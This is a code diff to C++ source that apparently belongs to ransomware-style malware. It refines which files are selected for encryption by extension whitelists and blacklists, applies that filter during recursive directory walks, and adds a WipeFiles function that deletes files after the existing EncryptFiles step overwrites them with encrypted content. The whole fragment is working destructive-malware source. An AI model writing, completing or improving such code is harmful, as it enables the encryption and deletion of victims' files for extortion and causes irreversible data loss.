@@ -13,24 +13,27 @@ bool isFileToEncrypt(const string& file) {
 
     vector<string> fileSplitted = Split(file, '.');
 
-    if (ENABLE_WHITELIST)
-        for (string extensionW : whitelist)
-            if (fileSplitted.back() == extensionW)
-                return true;
+#if ENABLE_WHITELIST
+    for (string extensionW : whitelist)
+        if (fileSplitted.back() == extensionW)
+            return true;
+#endif
 
-    if (ENABLE_BLACKLIST)
-        for (string extensionB : blacklist)
-            if (fileSplitted.back() == extensionB)
-                return false;
+#if ENABLE_BLACKLIST
+    for (string extensionB : blacklist)
+        if (fileSplitted.back() == extensionB)
+            return false;
+#endif
+
+    return true;
 }
 
 void GetAllFiles(const string& folderPath) {
     vector<string> tmpFiles;
 
     for (const auto& entry : fs::recursive_directory_iterator(folderPath))
-        if (fs::is_regular_file(entry))
-            if (isFileToEncrypt(entry.path().string()))
-                tmpFiles.push_back(entry.path().string());
+        if (fs::is_regular_file(entry) && isFileToEncrypt(entry.path().string()))
+            tmpFiles.push_back(entry.path().string());
 
     allFilesMutex.lock();
     globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
@@ -80,7 +83,7 @@ vector<string> GetFiles(const vector<string>& mainDirs) {
 
     for (string dir : mainDirs) {
         for (const auto& entry : fs::directory_iterator(dir)) {
-            if (fs::is_regular_file(entry))
+            if (fs::is_regular_file(entry) && isFileToEncrypt(entry.path().string()))
                 result.push_back(entry.path().string());
 
             else if (fs::is_directory(entry))
@@ -177,4 +180,11 @@ void EncryptFiles(const vector<string>& files, const string& key, const string& 
         fout.write((const char*)&content[0], content.size());
         fout.close();
     }
+}
+
+void WipeFiles(const std::vector<std::string>& files) {
+    for (string file : files)
+        if (!remove(file.c_str()))
+            DeleteFileA(file.c_str());
+    return;
 }
